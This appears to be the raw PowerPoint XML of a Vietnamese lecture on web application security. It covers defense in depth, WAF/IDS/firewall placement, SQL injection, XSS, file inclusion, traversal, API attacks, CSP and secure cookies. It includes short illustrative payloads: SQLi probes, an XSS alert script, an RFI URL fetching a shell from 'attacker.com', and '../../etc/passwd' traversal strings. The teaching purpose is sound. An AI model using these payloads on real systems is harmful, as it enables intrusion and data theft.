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65"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId6"/>
    <p:sldId id="257" r:id="rId7"/>
    <p:sldId id="261" r:id="rId8"/>
    <p:sldId id="313" r:id="rId9"/>
    <p:sldId id="407" r:id="rId10"/>
    <p:sldId id="408" r:id="rId11"/>
    <p:sldId id="409" r:id="rId12"/>
    <p:sldId id="410" r:id="rId13"/>
    <p:sldId id="411" r:id="rId14"/>
    <p:sldId id="412" r:id="rId15"/>
    <p:sldId id="413" r:id="rId16"/>
    <p:sldId id="401" r:id="rId17"/>
    <p:sldId id="414" r:id="rId18"/>
    <p:sldId id="415" r:id="rId19"/>
    <p:sldId id="416" r:id="rId20"/>
    <p:sldId id="402" r:id="rId21"/>
    <p:sldId id="417" r:id="rId22"/>
    <p:sldId id="418" r:id="rId23"/>
    <p:sldId id="419" r:id="rId24"/>
    <p:sldId id="420" r:id="rId25"/>
    <p:sldId id="421" r:id="rId26"/>
    <p:sldId id="422" r:id="rId27"/>
    <p:sldId id="423" r:id="rId28"/>
    <p:sldId id="403" r:id="rId29"/>
    <p:sldId id="436" r:id="rId30"/>
    <p:sldId id="437" r:id="rId31"/>
    <p:sldId id="438" r:id="rId32"/>
    <p:sldId id="439" r:id="rId33"/>
    <p:sldId id="440" r:id="rId34"/>
    <p:sldId id="404" r:id="rId35"/>
    <p:sldId id="441" r:id="rId36"/>
    <p:sldId id="442" r:id="rId37"/>
    <p:sldId id="443" r:id="rId38"/>
    <p:sldId id="444" r:id="rId39"/>
    <p:sldId id="406" r:id="rId40"/>
    <p:sldId id="445" r:id="rId41"/>
    <p:sldId id="447" r:id="rId42"/>
    <p:sldId id="449" r:id="rId43"/>
    <p:sldId id="450" r:id="rId44"/>
    <p:sldId id="451" r:id="rId45"/>
    <p:sldId id="452" r:id="rId46"/>
    <p:sldId id="453" r:id="rId47"/>
    <p:sldId id="454" r:id="rId48"/>
    <p:sldId id="446" r:id="rId49"/>
    <p:sldId id="448" r:id="rId50"/>
    <p:sldId id="405" r:id="rId51"/>
    <p:sldId id="426" r:id="rId52"/>
    <p:sldId id="427" r:id="rId53"/>
    <p:sldId id="428" r:id="rId54"/>
    <p:sldId id="429" r:id="rId55"/>
    <p:sldId id="430" r:id="rId56"/>
    <p:sldId id="431" r:id="rId57"/>
    <p:sldId id="432" r:id="rId58"/>
    <p:sldId id="433" r:id="rId59"/>
    <p:sldId id="434" r:id="rId60"/>
    <p:sldId id="435" r:id="rId61"/>
    <p:sldId id="353" r:id="rId62"/>
    <p:sldId id="424" r:id="rId63"/>
    <p:sldId id="425"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CC"/>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184" autoAdjust="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8.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9.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 xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative"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 xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative"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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>3.2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Bảo</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mật</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ứng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dụng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> Web (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Phần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> 2)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>BM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>hạ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tầng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mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> E-Commerce: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>VPN </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337313" y="855495"/>
            <a:ext cx="8622193"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3.2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>BẢO</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MẬT</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ỨNG</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DỤNG</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> WEB (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>PHẦN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> 2)</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336075" y="1522619"/>
            <a:ext cx="9000158" cy="4228811"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Kiến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trúc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cao</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biện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cao</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kiểm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ngừa</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SQLi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Quy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trình kiểm tra bảo mật ứng dụng Web</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 xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative"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349488"/>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3.2.1.</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Kiến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trúc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Mô hình phòng thủ nhiều lớp (Defense in Depth)</a:t>
            </a:r>
          </a:p>
          <a:p>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dựa vào một cơ chế bảo mật duy nhất mà kết hợp nhiều lớp kiểm soát, từ tầng mạng đến tầng ứng dụng.</a:t>
            </a:r>
          </a:p>
          <a:p>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ếu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lớp bị tấn công vượt qua, lớp khác sẽ tiếp tục bảo vệ.</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lớp phổ biến trong bảo mật ứng dụng web:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>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Network perimeter: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Firewall, VPN để ngăn chặn truy cập trái phép từ bên ngoài.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625"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Tầng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Middleware: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IDS/IPS phát hiện và chặn tấn công bất thường.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625"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Tầng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Application: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WAF kiểm soát truy cập vào ứng dụng web, phát hiện SQLi, XSS, CSRF.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625"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Tầng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Database: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ơ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chế mã hóa dữ liệu, phân quyền truy cập, backup an toàn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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3.2.1.</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Kiến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trúc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Vị trí WAF, IDS/IPS, và Firewall trong kiến trúc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Firewall (FW):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Đ</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ặt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ở biên mạng (giữa Internet và DMZ) để lọc gói theo địa chỉ IP, cổng, giao thức.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IDS/IPS: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hường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đặt song song hoặc sau firewall, giám sát lưu lượng vào/ra, phát hiện bất thường như tấn công DDoS, brute force.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Web Application Firewall (WAF):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Đ</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ặt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trước Web Server (thường trong DMZ), phân tích lưu lượng HTTP/HTTPS, ngăn chặn tấn công ứng dụng (SQLi, XSS, RFI, LFI</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quan hệ: FW xử lý mức mạng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IDS/IPS phân tích hành vi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WAF xử lý lưu lượng ứng dụng web.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>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8984820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3.2.1.</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Kiến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trúc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Kết hợp bảo mật tầng ứng dụng với tầng hạ tầng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Tầng hạ tầng (Infrastructure security):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server, hệ điều hành, DBMS, phân vùng mạng (DMZ, VLAN).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Tầng ứng dụng (Application security):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vệ logic ứng dụng, xác thực người dùng, quản lý session, mã hóa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hợp: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TLS để bảo mật kênh truyền (hạ tầng).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cơ chế xác thực đa yếu tố (2FA) ở tầng ứng dụng.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bản vá OS/DBMS + cập nhật framework web.</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Triển khai giám sát tập trung (SIEM) để kết nối log từ FW, IDS/IPS, WAF và ứng dụng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>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19600611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3.2.2.</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cao</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Blind SQL Injection (SQLi mù) &amp; Time-based SQLi</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Blind SQLi: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Ứ</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dụng không hiển thị thông báo lỗi SQL, kẻ tấn công phải suy đoán dữ liệu dựa vào phản hồi đúng/sai.</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id=5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AND 1=1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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trả về kết quả, </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id=5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AND 1=2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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có kết quả.</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Time-based SQLi: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thác bằng cách chèn lệnh làm trễ cơ sở dữ liệu (ví dụ: SLEEP(5)), nếu server phản hồi chậm chứng tỏ câu lệnh được thực thi.</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đích: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rích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xuất dữ liệu nhạy cảm (tài khoản, mật khẩu hash).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7556283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3.2.2.</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cao</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Stored XSS &amp; DOM-based XSS</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Stored XSS (XSS lưu trữ):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cript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hại được lưu lại trong CSDL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341313"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bình luận chứa &lt;script&gt;alert('XSS')&lt;/script&gt;), tất cả người dùng truy cập trang sẽ bị nhiễm.</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DOM-based XSS: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cript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được thực thi hoàn toàn ở phía client, khai thác cách JavaScript thao tác với DOM (ví dụ: lấy giá trị từ URL và chèn vào trang mà không lọc).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 hiểm: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ẻ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đánh cắp session, cookie, hoặc thực hiện hành vi thay mặt người dùng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1132290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3.2.2.</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cao</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Remote File Inclusion (RFI</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)/Local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File Inclusion (LFI)</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RFI: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hèn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đường dẫn file từ bên ngoài để server thực thi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341313"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?page=http://attacker.com/shell.txt).</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LFI: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L</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ợi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dụng để include file cục bộ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341313"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?page=../../etc/passwd).</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hạy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độc từ xa, rò rỉ thông tin hệ thống, cài webshell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10623321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3.2.2.</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cao</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Directory Traversal &amp; Path Disclosure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Directory Traversal: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thác ../ để truy cập thư mục nhạy cảm ngoài phạm vi cho phép.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ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN"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rPr>
              <a:t>http</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://site.com/view?file=../../etc/passwd.</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Path Disclosure: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Ứ</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dụng vô tình hiển thị đường dẫn file trên server (thông báo lỗi PHP, log debug).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 hiểm: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iúp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tin tặc định hướng tấn công sâu hơn, leo thang đặc quyền.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24786633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39239"/>
            <a:ext cx="10242645" cy="501555"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.2.</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cao</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8320"/>
            <a:ext cx="10242645"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Tấn công API (REST, GraphQL)</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REST API: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ễ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bị tấn công nếu không giới hạn request hoặc xác thực kém (ví dụ: brute force token JWT, bypass rate limit).</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GraphQL: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ó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thể bị “Introspection query” để dò toàn bộ schema, hoặc “Batching attack” (gửi nhiều query một lúc để khai thác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hiếm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quyền tài khoản, trích xuất dữ liệu nhạy cảm, gây từ chối dịch vụ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8214226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86053"/>
            <a:ext cx="10242645" cy="446964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.3.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cao</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820401"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Content Security Policy (CSP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>CSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>là một HTTP header cho phép chỉ định nguồn nội dung (script, style, hình ảnh, iframe…) mà trình duyệt được phép tải.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tác dụng:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn chặn XSS bằng cách từ chối thực thi script từ nguồn không tin cậy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Giảm nguy cơ Clickjacking và Data Injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="736600" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chỉ cho phép tải script từ domain chính và Google API.</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722674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86053"/>
            <a:ext cx="10242645" cy="446964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.3.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cao</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6"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Secure Cookie (HttpOnly, Secure, SameSite)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>HttpOnly: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găn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>JavaScript truy cập </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>cookie</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giảm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nguy cơ bị đánh cắp qua XSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Secure: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ookie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chỉ được gửi qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>HTTPS</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tránh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lộ thông tin qua HTTP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>SameSite: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ạn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chế cookie được gửi trong request </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>cross-site</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giảm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nguy cơ CSRF.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Set-Co</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okie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>: sessionId=abc123; HttpOnly; Secure; SameSite=Strict</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32916179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86053"/>
            <a:ext cx="10242645" cy="446964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.3.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cao</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6" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Bảo mật API (OAuth 2.0, JWT, Rate Limiting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>OAuth 2.0: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huẩn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>xác thực ủy quyền phổ biến, dùng cho login qua bên thứ ba (Google, Facebook).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>JWT (JSON Web Token):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ơ </a:t>
            </a:r>
